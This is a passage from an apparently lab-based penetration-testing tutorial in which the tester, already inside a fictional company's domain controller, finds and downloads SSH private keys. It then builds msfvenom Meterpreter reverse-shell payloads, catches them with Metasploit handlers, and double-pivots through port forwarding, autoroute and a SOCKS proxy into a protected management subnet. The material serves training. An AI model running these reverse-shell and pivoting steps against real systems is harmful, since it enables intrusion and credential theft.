<span class="hljs-comment">|S</span><span class="hljs-literal">-</span><span class="hljs-comment">chain|</span><span class="hljs-literal">-</span>&lt;&gt;<span class="hljs-literal">-</span><span class="hljs-comment">127</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">1:8083</span><span class="hljs-literal">-</span>&lt;&gt;&lt;&gt;<span class="hljs-literal">-</span><span class="hljs-comment">172</span><span class="hljs-string">.</span><span class="hljs-comment">16</span><span class="hljs-string">.</span><span class="hljs-comment">8</span><span class="hljs-string">.</span><span class="hljs-comment">3:5985</span><span class="hljs-literal">-</span>&lt;&gt;&lt;&gt;<span class="hljs-literal">-</span><span class="hljs-comment">OK</span>
<span class="hljs-comment">|S</span><span class="hljs-literal">-</span><span class="hljs-comment">chain|</span><span class="hljs-literal">-</span>&lt;&gt;<span class="hljs-literal">-</span><span class="hljs-comment">127</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">1:8083</span><span class="hljs-literal">-</span>&lt;&gt;&lt;&gt;<span class="hljs-literal">-</span><span class="hljs-comment">172</span><span class="hljs-string">.</span><span class="hljs-comment">16</span><span class="hljs-string">.</span><span class="hljs-comment">8</span><span class="hljs-string">.</span><span class="hljs-comment">3:5985</span><span class="hljs-literal">-</span>&lt;&gt;&lt;&gt;<span class="hljs-literal">-</span><span class="hljs-comment">OK</span>


    <span class="hljs-comment">Directory:</span> <span class="hljs-comment">C:\Department</span> <span class="hljs-comment">Shares</span>


<span class="hljs-comment">Mode</span>                <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">6/1/2022</span>  <span class="hljs-comment">11:34</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">Accounting</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">6/1/2022</span>  <span class="hljs-comment">11:34</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">Executives</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">6/1/2022</span>  <span class="hljs-comment">11:34</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">Finance</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">6/1/2022</span>  <span class="hljs-comment">11:33</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">HR</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">6/1/2022</span>  <span class="hljs-comment">11:33</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">IT</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">6/1/2022</span>  <span class="hljs-comment">11:33</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">Marketing</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">6/1/2022</span>  <span class="hljs-comment">11:33</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">R&amp;D</span>
</code></pre>
<p>Depending on the client industry and business, there are various things we can go after to demonstrate impact. HR data such as salaries and bonuses should be well-protected, R\&amp;D information could potentially hurt a company if it is leaked so they should have extra controls in place. It can be a good practice to not allow Domain Admins to have blanket access to all data, because if one account is compromised then everything will be. Some companies will have a separate site or non-domain joined file share or backup server to house sensitive data. In our case Inlanefreight has asked us to test if we can gain access to any hosts in the <code>172.16.9.0/23</code> subnet. This is their management network and houses sensitive servers that should be not directly accessible from hosts in the principal domain and gaining Domain Admin rights should not lead to immediate access.</p>
<p>Within the private IT share we can see two subdirectories: <code>Development</code> and <code>Networking</code>. The Development subdirectory houses the backup script that we obtained earlier. Let&#39;s take a look in the Networking subdirectory.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session"><span class="hljs-comment">*Evil</span><span class="hljs-literal">-</span><span class="hljs-comment">WinRM*</span> <span class="hljs-comment">PS</span> <span class="hljs-comment">C:\Department</span> <span class="hljs-comment">Shares\IT\Private</span>&gt; <span class="hljs-comment">ls</span>


    <span class="hljs-comment">Directory:</span> <span class="hljs-comment">C:\Department</span> <span class="hljs-comment">Shares\IT\Private</span>


<span class="hljs-comment">Mode</span>                <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">6/1/2022</span>  <span class="hljs-comment">11:34</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">Development</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">6/1/2022</span>  <span class="hljs-comment">11:34</span> <span class="hljs-comment">AM</span>                <span class="hljs-comment">Networking</span>
</code></pre>
<p>We can see SSH private keys for three different users. This is interesting.</p>
<p><code>Can any of these users be leveraged to access a host in the protected network?</code></p>
<p>Looking at the network adapters on the Domain Controllers we can see that it has a second NIC in the 172.16.9.0 network.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">*Evil-WinRM* PS C:\Department Shares\IT\<span class="hljs-keyword">Private</span>\Networking&gt; ipconfig /<span class="hljs-keyword">all</span>

|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;-OK

Windows IP Configuration

   Host Name . . . . . . . . . . . . : <span class="hljs-type">DC01</span>
   Primary Dns Suffix  . . . . . . . : <span class="hljs-type">INLANEFREIGHT.LOCAL</span>
   Node <span class="hljs-keyword">Type</span> <span class="hljs-type">. </span>. . . . . . . . . . . : <span class="hljs-type">Hybrid</span>
   IP Routing Enabled. . . . . . . . : <span class="hljs-type">No</span>
   WINS Proxy Enabled. . . . . . . . : <span class="hljs-type">No</span>
   DNS Suffix Search List. . . . . . : <span class="hljs-type">INLANEFREIGHT.LOCAL</span>

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   <span class="hljs-type">Description</span> . . . . . . . . . . . : <span class="hljs-type">vmxnet3</span> Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-<span class="hljs-type">B9</span>-<span class="hljs-number">16</span>-<span class="hljs-number">51</span>
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">No</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>
   Link-local IPv6 Address . . . . . : <span class="hljs-type">fe80</span>::<span class="hljs-number">8</span>c6e:<span class="hljs-number">6173</span>:<span class="hljs-number">2179</span>:e0a5%<span class="hljs-number">4</span>(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.8.3(<span class="hljs-type">Preferred</span>)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.8.1
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2<span class="hljs-type">A</span>-<span class="hljs-number">29</span>-<span class="hljs-number">62</span>-C9-<span class="hljs-number">00</span>-<span class="hljs-number">50</span>-<span class="hljs-number">56</span>-B9-<span class="hljs-number">16</span>-<span class="hljs-number">51</span>
   DNS Servers . . . . . . . . . . . : ::1
                                       <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
   NetBIOS over Tcpip. . . . . . . . : <span class="hljs-type">Enabled</span>

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   <span class="hljs-type">Description</span> . . . . . . . . . . . : <span class="hljs-type">vmxnet3</span> Ethernet Adapter #<span class="hljs-number">2</span>
   Physical Address. . . . . . . . . : 00-50-56-<span class="hljs-type">B9</span>-<span class="hljs-number">3</span>A-<span class="hljs-number">88</span>
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">No</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>
   Link-local IPv6 Address . . . . . : <span class="hljs-type">fe80</span>::ad24:d126:<span class="hljs-number">19</span>f:f31d%<span class="hljs-number">7</span>(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.9.3(<span class="hljs-type">Preferred</span>)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.9.1
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2<span class="hljs-type">A</span>-<span class="hljs-number">29</span>-<span class="hljs-number">62</span>-C9-<span class="hljs-number">00</span>-<span class="hljs-number">50</span>-<span class="hljs-number">56</span>-B9-<span class="hljs-number">16</span>-<span class="hljs-number">51</span>
   DNS Servers . . . . . . . . . . . : ::1
                                       <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
   NetBIOS over Tcpip. . . . . . . . : <span class="hljs-type">Enabled</span>
</code></pre>
<p>Typing <code>arp -a</code> to view the arp table does not yield anything interesting. We can use PowerShell to perform a ping sweep and attempt to identify live hosts.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking&gt;  <span class="hljs-number">1</span>..<span class="hljs-number">100</span> | % {<span class="hljs-string">"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"</span>}

|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.3</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.3</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;-OK
<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span>: False
<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.2</span>: False
<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.3</span>: True
<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.4</span>: False

&lt;SNIP&gt;

<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.24</span>: False
<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.25</span>: True
<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.26</span>: False
<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.27</span>: False

&lt;SNIP&gt;
</code></pre>
<p>We can see one live host, <code>172.16.9.25</code>, that perhaps one of the SSH private keys will work against. Let&#39;s get to work. First download the SSH keys via our <code>evil-winrm</code> connection to the Domain Controller.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">Evil-WinRM* PS C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\N</span>etworking&gt; download "C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\N</span>etworking<span class="hljs-symbol">\s</span>smallsadm-id_rsa" /tmp/ssmallsadm-id_rsa 

Info: Downloading C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\N</span>etworking<span class="hljs-symbol">\s</span>smallsadm-id_rsa to /tmp/ssmallsadm-id_rsa

|S-chain|-&lt;&gt;-127.0.0.1:8083-&lt;&gt;&lt;&gt;-172.16.8.3:5985-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-127.0.0.1:8083-&lt;&gt;&lt;&gt;-172.16.8.3:5985-&lt;&gt;&lt;&gt;-OK

Info: Download successful!

*Evil-WinRM* PS C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\N</span>etworking&gt;
</code></pre>
<hr>
<h3 id="the-double-pivot-mgmt01">The Double Pivot - MGMT01</h3>
<p>Now there are a few ways to do this next part, we&#39;ll take the long route so we can ultimately SSH directly into the <code>172.16.9.25</code> host from our attack box, performing a bit of a mindbending double pivot in the process. Here is what we are trying to achieve, starting from our attack host and pivoting through the dmz01 and DC01 hosts to be able to SSH directly into the MGMT01 host two hops away directly from our attack host.</p>
<p><code>Attack host</code> --&gt; <code>dmz01</code> --&gt; <code>DC01</code> --&gt; <code>MGMT01</code></p>
<p>We&#39;ll need to establish a reverse shell from the <code>dmz01</code> box back to our attack host. We can do this the same we way did in the <code>Internal Information Gathering</code> section, creating an ELF payload, uploading it to the target and executing it to catch a shell. Start by creating the ELF payload and uploading it back to the dmz01 host via SCP if you removed it.</p>
<p>Next, set up the Metasploit <code>exploit/multi/handler</code>.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; use exploit/multi/handler
[*] Using configured payload generic/shell<span class="hljs-emphasis">_reverse_</span>tcp
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; set payload linux/x86/meterpreter/reverse_tcp
payload =&gt; linux/x86/meterpreter/reverse_tcp
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; set lhost 10.10.14.15 
lhost =&gt; 10.10.14.15
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; set LPORT 443
LPORT =&gt; 443
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; exploit

[*] Started reverse TCP handler on 10.10.14.15:443
</code></pre>
<p>Once again, execute the <code>shell.elf</code> file on the target system:</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">
root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp</span><span class="hljs-comment"># chmod +x shell.elf </span>
root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp</span><span class="hljs-comment"># ./shell.elf</span>
</code></pre>
<p>Catch the Meterpreter shell using the multi/handler.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">[<span class="hljs-name">msf</span>](<span class="hljs-name">Jobs:0</span> Agents:0) exploit(<span class="hljs-name">multi/handler</span>) &gt;&gt; exploit

[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Started reverse TCP handler on <span class="hljs-number">10.10</span>.14.15:443 
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Sending stage (<span class="hljs-name">989032</span> bytes) to <span class="hljs-number">10.129</span>.203.111
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-name">10.10.14.15:443</span> -&gt; <span class="hljs-number">10.129</span>.203.111:58462 ) at <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-21</span> <span class="hljs-number">21</span>:28:43 <span class="hljs-number">-0400</span>

(<span class="hljs-name">Meterpreter</span> <span class="hljs-number">1</span>)(<span class="hljs-name">/tmp</span>) &gt; getuid
Server username: root
</code></pre>
<p>Next, set up a local port forwarding rule to forward all traffic destined to port <code>1234</code> on dmz01 to port <code>8443</code> on our attack host.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">(Meterpreter <span class="hljs-number">1</span>)(/root) &gt; portfwd <span class="hljs-keyword">add</span><span class="bash"> -R <span class="hljs-_">-l</span> 8443 -p 1234 -L 10.10.14.15
</span>[*] Reverse TCP relay created: (remote) :<span class="hljs-number">1234</span> -&gt; (local) [::]:<span class="hljs-number">1234</span>
</code></pre>
<p>Next, create an executable payload that we&#39;ll upload to the Domain Controller host.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfvenom -p windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.120</span> -f exe -o dc_shell.exe LPORT=<span class="hljs-number">1234</span>

[-] No platform was selected, choosing <span class="hljs-string">Msf:</span>:<span class="hljs-string">Module:</span>:<span class="hljs-string">Platform:</span>:Windows from the payload
[-] No arch selected, selecting <span class="hljs-string">arch:</span> x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-string">size:</span> <span class="hljs-number">510</span> bytes
Final size of exe <span class="hljs-string">file:</span> <span class="hljs-number">7168</span> bytes
Saved <span class="hljs-string">as:</span> dc_shell.exe
</code></pre>
<p>Upload the payload to the DC.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">*Evil-WinRM* PS C:\&gt; upload <span class="hljs-string">"/home/tester/dc_shell.exe"</span> 
<span class="hljs-symbol">
Info:</span> Uploading <span class="hljs-meta-keyword">/home/</span>tester/dc_shell.exe to C:\\dc_shell.exe
<span class="hljs-symbol">
Data:</span> <span class="hljs-number">9556</span> bytes of <span class="hljs-number">9556</span> bytes copied
<span class="hljs-symbol">
Info:</span> Upload successful!
</code></pre>
<p>Background the Meterpreter session</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">(Meterpreter 1)(/root) &gt; bg
[*] Backgrounding session 1...
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:1 Agents:1</span>) exploit(multi/script/web_delivery) &gt;&gt;
</code></pre>
<p>Start another multi/handler in the same msfconsole session to catch the shell from the DC.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) exploit(multi/handler) &gt;&gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) exploit(multi/handler) &gt;&gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) exploit(multi/handler) &gt;&gt; set lport 8443
lport =&gt; 8443
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) exploit(multi/handler) &gt;&gt; exploit
</code></pre>
<p>Execute the payload on the DC and, if all goes to plan, we&#39;ll catch it in our handler.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">*Evil-W<span class="hljs-keyword">in</span>RM* PS C:\Users\Administrator\Documents&gt; .\dc_shell.exe
|S-chain|-<span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span>:<span class="hljs-number">5985</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-OK
|S-chain|-<span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span>:<span class="hljs-number">5985</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-OK
</code></pre>
<p>Checking on our handler and we see the incoming connection. It appears to come from 0.0.0.0 because our port forwarding rule set earlier has specified that all traffic destined for our host on port 1234 should be directed to (our listener) on port 8443.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">[<span class="hljs-name">msf</span>](<span class="hljs-name">Jobs:0</span> Agents:1) exploit(<span class="hljs-name">multi/handler</span>) &gt;&gt; exploit

[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Started reverse TCP handler on <span class="hljs-number">0.0</span>.0.0:8443 
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Sending stage (<span class="hljs-name">200262</span> bytes) to <span class="hljs-number">10.10</span>.14.15
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Meterpreter session <span class="hljs-number">2</span> opened (<span class="hljs-name">10.10.14.15:8443</span> -&gt; <span class="hljs-number">10.10</span>.14.15:46313 ) at <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-22</span> <span class="hljs-number">21</span>:36:20 <span class="hljs-number">-0400</span>

(<span class="hljs-name">Meterpreter</span> <span class="hljs-number">2</span>)(<span class="hljs-name">C:</span>\) &gt; getuid
Server username: INLANEFREIGHT\Administrator
(<span class="hljs-name">Meterpreter</span> <span class="hljs-number">2</span>)(<span class="hljs-name">C:</span>\) &gt; sysinfo
Computer        : DC01
OS              : Windows <span class="hljs-number">2016</span>+ (<span class="hljs-name">10.0</span> Build <span class="hljs-number">17763</span>).
Architecture    : x64
System Language : en_US
Domain          : INLANEFREIGHT
Logged On Users : <span class="hljs-number">3</span>
Meterpreter     : x64/windows
</code></pre>
<p>For our next trick we&#39;ll set up a route to the <code>172.16.9.0/23</code> subnet.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">(Meterpreter <span class="hljs-number">2</span>)(C:\) &gt; run autoroute -s <span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.0</span>/<span class="hljs-number">23</span>

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute <span class="hljs-meta">OPTION</span>=value [...]
[*] Adding a route to <span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.0</span>/<span class="hljs-number">255.255</span><span class="hljs-meta">.254</span><span class="hljs-meta">.0</span>...
[+] Added route to <span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.0</span>/<span class="hljs-number">255.255</span><span class="hljs-meta">.254</span><span class="hljs-meta">.0</span> via <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>
[*] Use the -p <span class="hljs-meta">option</span> to list all active routes
</code></pre>
<p>We can confirm this by checking the MSF routing table.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">(Meterpreter 2)(C:\) &gt; background
[*] Backgrounding session 2...
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:2</span>) exploit(multi/handler) &gt;&gt; route print

<span class="hljs-section">IPv4 Active Routing Table
=========================</span>

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.9.0         255.255.254.0      Session 2
</code></pre>
<p>Now we need to set up a socks proxy which is the final step before we can communicate directly with the <code>172.16.9.0/23</code> network from our attack host.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:2</span>) exploit(multi/handler) &gt;&gt; use auxiliary/server/socks_proxy 
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:2</span>) auxiliary(server/socks_proxy) &gt;&gt; show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This
<span class="hljs-code">                                        must be an address on the local machine or 0.0.0.0 to l</span>
<span class="hljs-code">                                        isten on all addresses.</span>
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:2</span>) auxiliary(server/socks_proxy) &gt;&gt; set srvport 9050
srvport =&gt; 9050
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:2</span>) auxiliary(server/socks_proxy) &gt;&gt; set version 4a
version =&gt; 4a
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:2</span>) auxiliary(server/socks_proxy) &gt;&gt; run
[*] Auxiliary module running as background job 0.
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:1 Agents:2</span>) auxiliary(server/socks_proxy) &gt;&gt; 
[*] Starting the SOCKS proxy server
</code></pre>
<p>Edit the <code>/etc/proxychains.conf</code> file to use port <code>9050</code> that we specified above. If you already have a line in there from earlier, comment it out or replace the port number.</p>
<p>Now we can test this out by running Nmap against the target, and we confirm that we are able to scan it.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains nmap -<span class="hljs-built_in">sT</span> -p <span class="hljs-number">22</span> <span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.25</span>

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)
Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">22</span> <span class="hljs-number">21</span>:<span class="hljs-number">42</span> EDT
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.25</span>:<span class="hljs-number">80</span>-&lt;--denied
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.25</span>:<span class="hljs-number">22</span>-&lt;&gt;&lt;&gt;-OK
Nmap scan report for <span class="hljs-number">172.16</span><span class="hljs-meta">.9</span><span class="hljs-meta">.25</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">1.</span>1s latency).

PORT   STATE SERVICE
<span class="hljs-number">22</span>/tcp open  ssh

